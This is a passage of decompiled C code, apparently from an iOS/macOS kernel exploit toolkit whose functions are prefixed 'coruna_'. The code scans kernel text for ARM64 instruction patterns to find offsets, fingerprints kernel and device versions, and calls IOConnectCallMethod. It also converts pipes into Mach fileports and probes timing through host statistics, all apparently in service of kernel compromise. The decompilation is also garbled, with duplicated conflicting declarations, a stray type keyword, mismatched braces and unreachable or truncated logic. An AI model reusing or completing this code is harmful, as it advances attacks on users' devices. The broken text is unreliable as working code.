    do {
      u = coruna_kernel29bb0_via_kernel29bb0_via_nop_stub(val,handle + port + 4);
      if (((u & 0x9f000000) == 0x90000000) &&
         (size = coruna_kernel29bb0_via_kernel29bb0_via_nop_stub(val,handle + port + 0xc),
         ((uint)(size >> 0x15) & 0x7ff) == 0x458)) {
        version = coruna_return_zero_1555c(val,handle + port + 4,1);
        return version;
      }
      port = port + 4;
    } while (port < 0xfc);
  }
  return 0;
}





long coruna_kernel29bb0_via_kernel29bb0_via_kernel29bb0_via_nop_stub_2(uint64_t val,long handle)
{
  unsigned long u;
  unsigned long size;
  
  size = coruna_kernel29bb0_via_kernel29bb0_via_nop_stub();
  if (((uint)size & 0x7c000000) == 0x14000000) {
    u = (unsigned long)((uint)size & 0x1ffffff);
    if ((size & 0x2000000) != 0) {
      u = size | 0xfffffffffe000000;
    }
    if (u != 0) {
      return handle + u * 4;
    }
  }
  return 0;
}





void coruna_return_zero_1555c_stub(uint64_t val,uint64_t id_2)
{
  coruna_return_zero_1555c(val,id_2,1);
  return;
}





long coruna_return_zero_1528c(long handle,uint32_t *size)
{
  int err;
  long handle;
  uint64_t u;
  long addr;
  long off;
  uint64_t scratch;
  long bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  long serial_buf;
  long action;
  
  off = *(long *)(handle + 0x118);
  err = coruna_ctx_test_flag(off,0x20);
  if (err == 0) {
    handle = coruna_kernel29bb0_via_kernel29bb0_via_kernel29bb0_via_nop_stub(handle);
    if (handle == 0) {
      return 0;
    }
    scratch = 8;
fail:
    *size = (int)scratch;
  }
  else {
    coruna_macho_text_sect(&host_info,*(uint64_t *)(&k_kernel_slot_19f8 + off));
    bootargs = serial_buf + action + -0x20000;
    action = 0x20000;
    scratch = host_info;
    thread_attr = 0x20000;
    serial_buf = bootargs;
    handle = coruna_strsep(&scratch,"2B 09 40 B9 4B 39 0B 8B",0,1);
    if ((handle != 0) && (handle = coruna_return_zero_1555c(handle,handle + -0x28,1), handle != 0)) {
      u = coruna_kernel29bb0_trampoline_00010cac(handle,handle + -8);
      addr = coruna_ptr_canonicalize(off,u);
      if ((addr != 0) &&
         ((err = coruna_kernel29bb0_via_ioconnectcallmethod(off,u,&scratch), err != 0 && ((int)scratch - 1U < 0x20))))
      {
        handle = coruna_kernel29bb0_trampoline_00010cac(handle,handle);
        off = coruna_ptr_canonicalize(off,handle);
        if (off != 0) {
          goto fail;
        }
      }
    }
    handle = 0;
  }
  return handle;
}





long coruna_return_zero_154a0(long handle,int flags)
{
  long handle;
  char *ptr;
  char *buf;
  uint u;
  long addr;
  uint64_t size;
  uint8_t scratch[24];
  
  if (flags < 1) {
    handle = handle + (long)flags * 8;
    if (*(long *)(&k_kernel_slot_1960 + handle) != 0) {
      return *(long *)(&k_kernel_slot_1960 + handle);
    }
    if (flags == 0) {
      size = *(uint64_t *)(&k_kernel_slot_19f8 + handle);
      u = coruna_iosurface_gen_index(size);
      coruna_macho_text_sect(scratch,size);
      ptr = "09 .. 00 F9 E1 03 00 32 00 00 80 52";
      if (u != 1) {
        ptr = (char *)0x0;
      }
      buf = "09 .. 00 F9 00 00 80 52 E1 03 00 32";
      if (u < 2) {
        buf = ptr;
      }
      addr = coruna_strsep(scratch,buf,0,0);
      if (addr == 0) {
        return 0;
      }
      addr = coruna_kernel29bb0_via_kernel29bb0_via_kernel29bb0_via_nop_stub_2(size,addr + 0xc);
      if (addr == 0) {
        return 0;
      }
      *(long *)(&k_kernel_slot_1960 + handle) = addr;
      return addr;
    }
  }
  return 0;
}





long coruna_return_zero_1555c(uint64_t val,unsigned long arg,int flags)
{
  uint u;
  int err;
  uint size;
  unsigned long version;
  uint64_t port;
  unsigned long tag;
  long handle;
  bool err;
  
  if ((arg & 3) == 0) {
    version = coruna_kernel29bb0_via_kernel29bb0_via_nop_stub();
    u = (uint)version;
    if (u == 0xd503201f) {
      port = coruna_kernel29bb0_via_kernel29bb0_via_nop_stub(val,arg + 4);
      u = (uint)port >> 5;
      version = (unsigned long)(u & 0x7ffff) << 2;
      if ((u & 0x40000) != 0) {
        version = version | 0xfffffffffff00000;
      }
      if (((uint)((unsigned long)port >> 0x18) & 0xff) != 0x58) {
        return 0;
      }
      return version + arg + 4;
    }
    if ((u & 0x9f000000) == 0x90000000) {
      handle = (arg & 0xfffffffffffff000) +
              (long)(int)(u >> 0x11 & 0x3000 | (u >> 5) << 0xe);
    }
    else {
      if (((u & 0x9f000000) != 0x10000000) ||
         (err = coruna_kernel29bb0_via_kernel29bb0_via_nop_stub(val,arg + 4), err != -0x2afcdfe1)) goto fail;
      tag = (unsigned long)((uint)(version >> 3) & 0x1ffffc | u >> 0x1d & 3);
      if ((version >> 3 & 0x100000) != 0) {
        tag = tag | 0xffffffffffe00000;
      }
      handle = tag + arg;
    }
    err = false;
    u = u & 0x1f;
    version = arg + 0x20;
    while( true ) {
      arg = arg + 4;
      size = coruna_kernel29bb0_via_kernel29bb0_via_nop_stub(val,arg);
      if (((size & 0x7f000000) == 0x11000000) && (!err)) {
        if ((size >> 5 & 0x1f) == u) {
          tag = (unsigned long)(size >> 10 & 0xfff);
          if ((size & 0xc00000) != 0) {
            tag = tag << 0xc;
          }
          handle = tag + handle;
          if (flags == 0) {
            return handle;
          }
          if (u != (size & 0x1f)) {
            return handle;
          }
          err = true;
        }
        else {
          err = false;
        }
      }
      if (((size & 0xbfc00000) == 0xb9400000) && ((size >> 5 & 0x1f) == u)) break;
      if ((size & 0xffc00000) == 0xb9800000) {
        if ((size >> 5 & 0x1f) == u) {
          version = (unsigned long)(size >> 8 & 0x3ffc);
          goto done;
        }
      }
      else if (((size & 0xffc00000) == 0x39400000) && ((size >> 5 & 0x1f) == u)) {
        version = (unsigned long)(size >> 10 & 0xfff);
        goto done;
      }
      if (size == 0xd65f03c0) {
        return handle;
      }
      if (version < arg) {
        return handle;
      }
    }
    version = (unsigned long)(size >> 10 & 0xfff) << (size >> 0x1e);
done:
    handle = handle + version;
  }
  else {
fail:
    handle = 0;
  }
  return handle;
}





void coruna_host_kernel_version_1526c(char *path,unsigned long arg)
{
  mach_port_t host;
  uint u;
  int err;
  int *err;
  uint *ptr;
  size_t ls5;
  uint64_t scratch;
  size_t bootargs;
  char scratch [512];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  if (800.0 <= *(double *)k_kernel_dyldversionnumber_slot) {
    scratch = k_kernel_rodata_word_2ae20;
    bootargs = 0x200;
    err = _sysctl((int *)&scratch,2,scratch,&bootargs,(void *)0x0,0);
    if (err != 0) {
      err = ___error();
      err = *err;
      ptr = (uint *)___error();
      u = -*ptr;
      if (-1 < err) {
        u = *ptr;
      }
      u = u | 0x40000000;
      if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
      return;
      }
      ___stack_chk_fail(u);
    }
  }
  else {
    host = _mach_host_self();
    u = _host_kernel_version(host,scratch);
    if (u != 0) {
      u = u | 0x80000000;
      if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
      return;
      }
      ___stack_chk_fail(u);
    }
  }
  ls5 = _strlen(scratch);
  if (arg < ls5 + 1) {
    u = 0xad00c;
  }
  else {
    _strlcpy(path,scratch,arg);
    u = 0;
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(u);
}





void coruna_parse_libsyscall_version(uint64_t *val,uint32_t *size,uint32_t *flags_2)
{
  int err;
  char *ptr;
  size_t ls3;
  int *err;
  uint64_t u;
  char *buf;
  uint64_t scratch;
  char scratch [512];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0;
  if (k_kernel_rodata_word_2ae28 <= *(double *)k_kernel_dyldversionnumber_slot) {
    ___strlcpy_chk(scratch,k_kernel_kernelversionstring_slot,0x200,0x200);
    ls3 = _strlen(scratch);
    u = 0;
    if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
    }
    ___stack_chk_fail(u);
  }
  else {
    err = coruna_host_kernel_version_1526c(scratch,0x200);
    if (err == 0) {
      ptr = _strstr(scratch,"RELEASE");
      u = 0;
      if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
      return;
      }
      ___stack_chk_fail(u);
    }
  }
  u = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(u);
}





uint64_t coruna_vm_page_info(vm_map_t arg,mach_vm_address_t arg_x,uint64_t *val)
{
  kern_return_t lk1;
  mach_msg_type_number_t scratch;
  int bootargs [2];
  uint64_t thread_attr;
  uint64_t host_info;
  
  scratch = 8;
  lk1 = _mach_vm_page_info(arg,arg_x,1,bootargs,&scratch);
  if (lk1 == 0) {
    if (val != (uint64_t *)0x0) {
      *val = host_info;
    }
  }
  else {
    thread_attr = 0;
  }
  return thread_attr;
}





uint coruna_cpu_core_count(void)
{
  uint u;
  
  u = __get_cpu_capabilities();
  return u >> 0x10 & 0xff;
}





uint64_t coruna_kernel29bb0_via_cpu_capabilities_base(void)
{
  long handle;
  uint64_t u;
  
  handle = coruna_cpu_capabilities_base();
  u = 0;
  if (handle != 0) {
    u = *(uint64_t *)(handle + 0x38);
  }
  return u;
}





uint32_t coruna_host_page_size(void)
{
  mach_port_t lm1;
  kern_return_t lk2;
  uint32_t scratch[2];
  
  lm1 = _mach_host_self();
  lk2 = _host_page_size(lm1,(vm_size_t *)scratch);
  if (lk2 != 0) {
    scratch[0] = 0;
  }
  return scratch[0];
}





uint32_t coruna_task_info(task_name_t arg)
{
  kern_return_t lk1;
  mach_msg_type_number_t scratch;
  integer_t bootargs [3];
  uint32_t thread_attr;
  
  scratch = 0x24;
  lk1 = _task_info(arg,0x16,bootargs,&scratch);
  if (lk1 != 0) {
    thread_attr = 0;
  }
  return thread_attr;
}





uint coruna_kernel29bb0_residual_163(void)
{
  uint64_t u;
  uint size;
  uint version;
  
  if (k_kernel_rodata_word_2af10 <= *(double *)k_kernel_dyldversionnumber_slot) {
    size = 0xfff;
    u = tpidr_el0;
    version = (uint)u;
  }
  else {
    size = 7;
    u = tpidrro_el0;
    version = (uint)u;
  }
  return size & version;
}





kern_return_t coruna_task_info_156e4(task_name_t arg,uint64_t *val,uint64_t *id_2)
{
  kern_return_t lk1;
  mach_msg_type_number_t scratch;
  integer_t bootargs [38];
  uint64_t thread_attr;
  uint64_t scratch;
  
  scratch = 0x2a;
  lk1 = _task_info(arg,0x16,bootargs,&scratch);
  if (lk1 == 0) {
    if (scratch == 0x2a) {
      lk1 = 0;
      *val = thread_attr;
      *id_2 = scratch;
    }
    else {
      lk1 = 4;
    }
  }
  return lk1;
}





uint64_t coruna_sysctl(uint32_t *size)
{
  int err;
  uint64_t u;
  uint32_t scratch;
  int bootargs [2];
  size_t thread_attr;
  
  bootargs[0] = 6;
  bootargs[1] = 6;
  thread_attr = 4;
  err = _sysctl(bootargs,2,&scratch,&thread_attr,(void *)0x0,0);
  if (err < 0) {
    u = 0xffffffff;
  }
  else {
    u = 0;
    *size = scratch;
  }
  return u;
}





uint64_t coruna_kernel29bb0_via_host_statistics64(long handle,int *flags)
{
  uint64_t u;
  long handle;
  int err;
  int scratch;
  
  u = coruna_host_statistics64(handle,&scratch);
  if ((int)u == 0) {
    err = *(int *)(handle + 400);
    if (err == 0) {
      handle = coruna_cpu_capabilities_base();
      if (handle == 0) {
        err = 0;
      }
      else {
        err = 0x7fff0000;
        if (*(unsigned long *)(handle + 0x38) >> 0x20 == 0) {
          err = (int)*(unsigned long *)(handle + 0x38);
        }
      }
      *(int *)(handle + 400) = err;
    }
    *flags = err - *(int *)(handle + 0x180) * scratch;
  }
  return u;
}





void coruna_host_statistics64(long handle,integer_t *arg)
{
  uint u;
  mach_port_t lm2;
  int err;
  unsigned long size;
  host_info_t host_info64_out;
  mach_msg_type_number_t scratch;
  uint8_t bootargs[152];
  int thread_attr [2];
  uint8_t *host_info;
  mach_msg_type_number_t serial_buf [4];
  uint8_t *action;
  uint32_t block_ctx;
  uint32_t stack_guard;
  uint8_t *sa_saved;
  uint32_t sa_new;
  uint32_t path_buf;
  uint8_t *tmp_buf;
  uint32_t region;
  long plist;
  
  plist = *(long *)k_kernel_stack_chk_guard_slot;
  host_info = bootargs;
  thread_attr[0] = 2;
  serial_buf[0] = 0xc;
  action = bootargs;
  serial_buf[2] = 2;
  block_ctx = 0xe;
  sa_saved = bootargs;
  stack_guard = 2;
  sa_new = 0xf;
  tmp_buf = bootargs;
  path_buf = 4;
  region = 0x18;
  u = *(uint *)(handle + 0x17c);
  *(uint *)(handle + 0x17c) = u + 1;
  size = (unsigned long)u & 3;
  if (thread_attr[size * 6] == 4) {
    scratch = serial_buf[size * 6];
    lm2 = _mach_host_self();
    host_info64_out = *(host_info_t *)(serial_buf + size * 6 + -2);
    err = _host_statistics64(lm2,4,host_info64_out,&scratch);
  }
  else {
    if (thread_attr[size * 6] != 2) {
      err = 0x2e;
      if (*(long *)k_kernel_stack_chk_guard_slot == plist) {
      return;
      }
      ___stack_chk_fail(err);
    }
    scratch = serial_buf[size * 6];
    lm2 = _mach_host_self();
    host_info64_out = *(host_info_t *)(serial_buf + size * 6 + -2);
    err = _host_statistics(lm2,2,host_info64_out,&scratch);
  }
  if (err == 0) {
    err = 0;
    *arg = host_info64_out[3];
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == plist) {
    return;
  }
  ___stack_chk_fail(err);
}





uint64_t coruna_host_priv_statistics(long handle,int *flags)
{
  mach_port_t lm1;
  kern_return_t lk2;
  uint64_t u;
  int *err;
  long handle;
  uint size;
  int err;
  integer_t scratch [3];
  int bootargs;
  mach_msg_type_number_t thread_attr;
  
  size = *(uint *)(handle + 4);
  if ((size & 1) == 0) {
    u = coruna_sysctl(flags);
    if ((int)u == 0) {
      return u;
    }
    err = ___error();
    size = *(uint *)(handle + 4);
    if (*err == 1) {
      size = size | 1;
      *(uint *)(handle + 4) = size;
    }
    size = size >> 1 & 1;
    }
    if (size != 0) {
    return u;
  }
  else {
    u = 0xffffffff;
    thread_attr = 0xf;
    lm1 = _mach_host_self();
    lk2 = _host_priv_statistics(lm1,2,scratch,&thread_attr);
    err = *(int *)(handle + 400);
    if (err == 0) {
    handle = coruna_cpu_capabilities_base();
    if (handle == 0) {
    err = 0;
    }
    else {
    err = 0x7fff0000;
    if (*(unsigned long *)(handle + 0x38) >> 0x20 == 0) {
    err = (int)*(unsigned long *)(handle + 0x38);
    }
    }
    *(int *)(handle + 400) = err;
    }
    *flags = err - *(int *)(handle + 0x180) * bootargs;
    return 0;
  }
  if (size != 0) {
    return u;
  }
  thread_attr = 0x26;
  lm1 = _mach_host_self();
  lk2 = _host_statistics64(lm1,4,scratch,&thread_attr);
  if (lk2 != 0) {
    return u;
  }
cleanup:
  err = *(int *)(handle + 400);
  if (err == 0) {
    handle = coruna_cpu_capabilities_base();
    if (handle == 0) {
      err = 0;
    }
    else {
      err = 0x7fff0000;
      if (*(unsigned long *)(handle + 0x38) >> 0x20 == 0) {
        err = (int)*(unsigned long *)(handle + 0x38);
      }
    }
    *(int *)(handle + 400) = err;
  }
  *flags = err - *(int *)(handle + 0x180) * bootargs;
  return 0;
}
uint64_t coruna_host_priv_statistics_11020(long handle)
{
  uint8_t *ptr;
  uint8_t *buf;
  long handle;
  bool err;
  int err;
  mach_port_t lm6;
  kern_return_t lk7;
  int *err;
  uint u;
  vm_size_t size;
  long addr;
  long off;
  mach_msg_type_number_t scratch [13];
  long bootargs;
  vm_address_t thread_attr;
  
  if (*(char *)(handle + 0xb) == '\0') {
    u = *(uint *)(handle + 4);
    if ((u & 1) == 0) {
      scratch[1] = 0;
      err = coruna_sysctl(scratch + 1);
      if (err == 0) {
        return 1;
      }
      err = ___error();
      u = *(uint *)(handle + 4);
      if (*err == 1) {
        u = u | 1;
        *(uint *)(handle + 4) = u;
      }
    }
    if ((u >> 2 & 1) == 0) {
      thread_attr = coruna_u64_pack((thread_attr), (0xf));
      lm6 = _mach_host_self();
      lk7 = _host_priv_statistics
                        (lm6,2,(host_info_t)(scratch + 1),(mach_msg_type_number_t *)&thread_attr);
      if (lk7 == 0) {
        return 1;
      }
      u = *(uint *)(handle + 4) | 4;
      *(uint *)(handle + 4) = u;
    }
    buf = k_kernel_vm_page_size_slot;
    ptr = k_kernel_mach_task_self_slot;
    if ((u >> 1 & 1) == 0) {
      thread_attr = 0;
      size = *(long *)k_kernel_vm_page_size_slot << 5;
      lk7 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&thread_attr,size,1);
      if (lk7 == 0) {
        addr = 0;
        handle = 0;
        do {
          off = handle;
          scratch[0] = 0x26;
          *(uint8_t *)(*(long *)buf * addr + thread_attr) = 0;
          lm6 = _mach_host_self();
          lk7 = _host_statistics64(lm6,4,(host_info64_t)(scratch + 1),scratch);
          if (lk7 != 0) {
            _vm_deallocate(*(vm_map_t *)ptr,thread_attr,size);
            *(uint *)(handle + 4) = *(uint *)(handle + 4) | 2;
            return 0;
          }
          err = addr != 0x1f;
          addr = addr + 1;
          handle = bootargs;
        } while (off != bootargs && err);
        _vm_deallocate(*(vm_map_t *)ptr,thread_attr,size);
        if (off != bootargs) {
          return 1;
        }
      }
fail:
      *(uint *)(handle + 4) = *(uint *)(handle + 4) | 2;
      return 0;
    }
  }
  return 0;
}





long coruna_call_syscall(void)
{
  int err;
  
  err = coruna_syscall();
  return (long)err;
}





long coruna_call_syscall_293b0(void)
{
  int err;
  
  err = coruna_syscall();
  return (long)err;
}





uint64_t coruna_mach_absolute_time_f2bc(long handle)
{
  void (*ptr)(void);
  int err;
  uint64_t u;
  unsigned long unaff_x30;
  
  if (*(char *)(handle + 10) == '\0') {
    err = coruna_syscall();
    return (long)err;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  u = _mach_absolute_time();
  return u;
}





bool coruna_kernel29bb0_via_cpu_capabilities_base_2(uint32_t *size)
{
  long handle;
  
  handle = coruna_cpu_capabilities_base();
  if (handle != 0) {
    *size = *(uint32_t *)(handle + 0x80);
  }
  return handle != 0;
}





uint64_t coruna_iomfb_slot_read(uint size,uint64_t *val)
{
  uint64_t *ptr;
  uint32_t *buf;
  uint64_t u;
  
  u = 0xad009;
  if (size < 4) {
    u = 0xad001;
  }
  else {
    ptr = _calloc(0x10,1);
    if (ptr != (uint64_t *)0x0) {
      buf = _calloc((unsigned long)size,1);
      *ptr = buf;
      if (buf == (uint32_t *)0x0) {
        _free(ptr);
      }
      else {
        u = 0;
        *buf = 0xd3;
        *(uint32_t *)(ptr + 1) = 4;
        *(uint *)((long)ptr + 0xc) = size;
        *val = ptr;
      }
    }
  }
  return u;
}





uint64_t coruna_return_zero_15824(long *handle,uint size,uint flags_2,uint64_t *val)
{
  uint64_t u;
  uint size;
  long handle;
  uint version;
  
  u = 0xad001;
  if ((flags_2 & 0xff000000) == 0) {
    size = (size & 0x7f000000) - 0x1000000 >> 0x18;
    if (size < 0xc) {
      version = 1 << (unsigned long)(size & 0x1f);
      if ((version & 0xc07) == 0) {
        if ((version & 0x380) == 0) {
          if (size != 3) {
            return 0xad001;
          }
          size = 0xc;
        }
        else {
          size = flags_2 + 7 & 0xfffffffc;
        }
      }
      else {
        size = 4;
      }
      if (*(int *)((long)handle + 0xc) - *(uint *)(handle + 1) < size) {
        u = 0xad00c;
      }
      else {
        handle = *handle;
        *(uint *)(handle + (unsigned long)*(uint *)(handle + 1)) = flags_2 | size;
        size = (int)handle[1] + 4;
        *(uint *)(handle + 1) = size;
        version = (size & 0x7f000000) + 0xfc000000 >> 0x18;
        if (version - 4 < 3) {
          version = flags_2 + 3 & 0xfffffffc;
          _memcpy((void *)(handle + (unsigned long)size),val,(unsigned long)flags_2);
        }
        else {
          if (version != 0) {
            return 0;
          }
          *(uint64_t *)(handle + (unsigned long)size) = *val;
          version = 8;
        }
        u = 0;
        *(uint *)(handle + 1) = (int)handle[1] + version;
      }
    }
  }
  return u;
}





uint64_t coruna_memcpy_15934(long *handle,uint64_t *val,uint32_t *size)
{
  uint u;
  void *ptr;
  uint64_t size;
  
  size = 0xad001;
  if (((*handle != 0) && (u = *(uint *)(handle + 1), u != 0)) &&
     (*(int *)((long)handle + 0xc) != 0)) {
    ptr = _malloc((unsigned long)u);
    *val = ptr;
    if (ptr == (void *)0x0) {
      size = 0xad009;
    }
    else {
      _memcpy(ptr,(void *)*handle,(unsigned long)u);
      size = 0;
      *size = (int)handle[1];
    }
  }
  return size;
}





uint64_t coruna_free_15ed4(uint64_t *val)
{
  if ((void *)*val != (void *)0x0) {
    _free((void *)*val);
  }
  *val = 0;
  val[1] = 0;
  _free(val);
  return 0;
}





uint coruna_pipe_open(int *flags)
{
  int err;
  uint u;
  int *err;
  uint *ptr;
  
  err = _pipe((int)flags);
  if (err == 0) {
    if ((*flags == -1) || (flags[1] == -1)) {
      u = 0x2802a;
    }
    else {
      u = 0;
    }
  }
  else {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  return u;
}





uint coruna_mach_port_deallocate_11510(int *flags,uint32_t *size,uint32_t *flags_2)
{
  uint8_t *ptr;
  int err;
  int *err;
  uint *buf;
  uint u;
  uint64_t scratch;
  
  scratch = 0;
  err = _fileport_makeport(*flags,&scratch);
  if ((err == 0) && (err = _fileport_makeport(flags[1],(unsigned long)&scratch | 4), err == 0)) {
    *size = (mach_port_name_t)scratch;
    *flags_2 = scratch;
    _close(*flags);
    _close(flags[1]);
    u = 0;
    flags[0] = -1;
    flags[1] = -1;
  }
  else {
    err = ___error();
    err = *err;
    buf = (uint *)___error();
    ptr = k_kernel_mach_task_self_slot;
    u = -*buf;
    if (-1 < err) {
      u = *buf;
    }
    u = u | 0x40000000;
    if (1 < (mach_port_name_t)scratch + 1) {
      _mach_port_deallocate
                (*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)scratch);
    }
    if (1 < scratch + 1) {
      _mach_port_deallocate(*(ipc_space_t *)ptr,scratch);
    }
  }
  return u;
}





uint coruna_mach_port_deallocate_115f4(long handle,uint64_t val)
{
  uint u;
  ipc_space_t *err;
  bool err;
  int err;
  int status;
  mach_port_name_t *lpm6;
  int *status;
  uint *ptr;
  unsigned long size;
  uint version;
  mach_port_name_t *lpm11;
  mach_port_name_t *lpm12;
  unsigned long port;
  mach_port_name_t scratch;
  char bootargs [8];
  uint16_t thread_attr;
  long host_info;
  
  host_info = *(long *)k_kernel_stack_chk_guard_slot;
  version = 0xad001;
  if (*(long *)k_kernel_stack_chk_guard_slot != host_info) {
  ___stack_chk_fail();
  }
  return version;
}





uint8_t * coruna_kernel29bb0_via_host_priv_statistics(long handle,long addr_2,long off_3,uint size,uint flags_2,int *flags,
            uint *count_3,uint *version_4,uint *version_5)
{
  uint u;
  int err;
  uint *ptr;
  bool err;
  bool status;
  bool flags;
  int status;
  long handle;
  long addr;
  uint size;
  uint version;
  uint8_t *buf;
  unsigned long port;
  unsigned long tag;
  unsigned long kind;
  uint type_id;
  unsigned long type_id_8;
  unsigned long type_id_9;
  uint type_id_10;
  uint type_id_11;
  unsigned long type_id_12;
  double ld22;
  double ld23;
  uint scratch;
  uint bootargs;
  unsigned long thread_attr;
  uint host_info;
  uint serial_buf;
  uint64_t action;
  int block_ctx;
  int stack_guard;
  uint sa_saved;
  
  block_ctx = 0;
  stack_guard = 0;
  action = 0xffffffffffffffff;
  if (*(int *)(handle + 0x140) == 0x1809) {
    version = 0x180;
  }
  else {
    if (*(int *)(handle + 0x140) != 0x1c1b) {
      return (uint8_t *)0x28007;
    }
    version = 0x168;
  }
  buf = &k_kernel_rodata_word_2e012;
  serial_buf = flags_2;
  bootargs = coruna_call_helper_282d0(handle,version,&sa_saved);
  u = *(uint *)(handle + 0x180);
  type_id_10 = 0;
  if (u != 0) {
    type_id_10 = version / u;
  }
  err = version - type_id_10 * u;
  status = 0;
  if (err != 0) {
    status = u - err;
  }
  if (size != 0) {
    type_id_8 = 0;
    type_id_10 = 0;
    size = 0;
    type_id_9 = 0;
    tag = 0;
    u = status + version;
    thread_attr = (unsigned long)size;
    scratch = 0;
    if (version != 0) {
      scratch = u / version;
    }
    do {
      handle = coruna_mach_absolute_time_f2bc(handle);
      buf = (uint8_t *)coruna_pipe_open(&action);
      if (1 < (int)action + 1U) {
      _close((int)action);
      }
      if (1 < action + 1U) {
      _close(action);
      }
      return buf;
    } while (thread_attr != type_id_8);
    version = 0xe012;
retry:
    buf = (uint8_t *)(unsigned long)(version | 0x20000);
  }
fail:
  if (1 < (int)action + 1U) {
    _close((int)action);
  }
  if (1 < action + 1U) {
    _close(action);
  }
  return buf;
}





void coruna_fd_drain(int *flags)
{
  int err;
  uint u;
  ssize_t ls3;
  int *err;
  uint *ptr;
  uint8_t scratch[256];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  do {
    ls3 = _read(*flags,scratch,0x100);
  } while (0 < ls3);
  err = ___error();
  if (*err == 0x23) {
    u = 0;
  }
  else {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(u);
}





void coruna_call_fcntl(uint32_t *size)
{
  void (*ptr)(void);
  int err;
  unsigned long unaff_x30;
  
  err = coruna_fcntl(*size);
  if (err != 0) {
    return;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_fcntl(size[1]);
  return;
}





uint coruna_fcntl(int flags)
{
  int err;
  uint u;
  int *err;
  uint *ptr;
  
  if (flags == -1) {
    u = 0xad001;
  }
  else {
    err = _fcntl(flags,0x49);
    if ((((err != -1) && (err = _fcntl(flags,1), err != -1)) &&
        (err = _fcntl(flags,2), err != -1)) &&
       ((err = _fcntl(flags,3), err != -1 && (err = _fcntl(flags,4), err != -1)))) {
      return 0;
    }
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  return u;
}





uint coruna_write(long handle,void *ctx,size_t len)
{
  uint u;
  int err;
  size_t ls3;
  int *err;
  uint *ptr;
  
  ls3 = _write(*(int *)(handle + 4),ctx,len);
  if ((long)ls3 < 0) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  else {
    u = 0;
    if (ls3 != len) {
      u = 0x2803a;
    }
  }
  return u;
}





uint coruna_fd_read_full(int *flags,void *ctx,size_t len)
{
  uint u;
  int err;
  size_t ls3;
  int *err;
  uint *ptr;
  
  ls3 = _read(*flags,ctx,len);
  if ((long)ls3 < 0) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  else {
    u = 0;
    if (ls3 != len) {
      u = 0x2803b;
    }
  }
  return u;
}
uint64_t
void coruna_helper_f0b0_14c60(long handle,uint64_t *val,uint64_t *id_2,long addr_2,uint size,
            uint32_t *size_x,uint64_t *size_3,long off_3,uint flags_2,uint32_t *flags_2_x)
{
  long handle;
  uint64_t u;
  uint64_t size;
  int err;
  uint64_t version;
  uint port;
  uint32_t tag;
  uint64_t *ptr;
  long addr;
  
  if (*(int *)(handle + 0x140) == 0x1809) {
    port = 0xa0;
    if (*(unsigned long *)(handle + 0x158) < 0x18090a09600000) {
      port = 0xa8;
    }
    err = coruna_ctx_test_flag(handle,0x5584001);
    tag = 0x380;
    if (err != 0) {
      tag = 0x388;
    }
    err = coruna_ctx_test_flag(handle,0x5584001);
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    handle = 0x3b8;
    if (err != 0) {
      handle = 0x3c0;
    }
    val[5] = 0;
    val[4] = 0;
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[0xb] = 0;
    val[10] = 0;
    val[0xd] = 0;
    val[0xc] = 0;
    *val = size_3;
    val[1] = off_3;
    *(uint *)(val + 2) = flags_2;
    if (flags_2_x != (uint32_t *)0x0) {
      *(uint32_t *)((long)val + 0x14) = *flags_2_x;
      *(uint32_t *)(val + 3) = flags_2_x[1];
    }
    val[4] = id_2;
    val[5] = addr_2;
    *(uint *)(val + 6) = size;
    if (size_x != (uint32_t *)0x0) {
      *(uint32_t *)((long)val + 0x34) = *size_x;
      *(uint32_t *)(val + 7) = size_x[1];
    }
    *(uint64_t *)((long)val + 0x44) = k_kernel_rodata_word_2ae30;
    *(uint *)((long)val + 0x4c) = port;
    val[10] = k_kernel_rodata_word_2ae38;
    *(uint32_t *)(val + 0xb) = 0x100;
    *(uint32_t *)((long)val + 0x5c) = tag;
    val[0xc] = k_kernel_rodata_word_2ae40;
    *(uint32_t *)((long)val + 0x6c) = 0x58;
    ptr = size_3;
    addr = off_3;
    if ((id_2 != (uint64_t *)0x0) && (size != 0)) {
      _bzero(id_2,(unsigned long)size);
      ptr = id_2;
      addr = addr_2;
    }
    _bzero(size_3,(unsigned long)flags_2);
    u = k_kernel_rodata_word_2ae48;
    version = 0;
    *(uint32_t *)(ptr + 2) = 0x11;
    ptr[0xd] = off_3 + 0x200;
    *ptr = u;
    *(uint64_t *)((long)ptr + (unsigned long)port) = 0xff000000ff;
    size = k_kernel_rodata_word_0002ae78;
    u = k_kernel_rodata_word_2ae70;
    size_3[0x23] = 0;
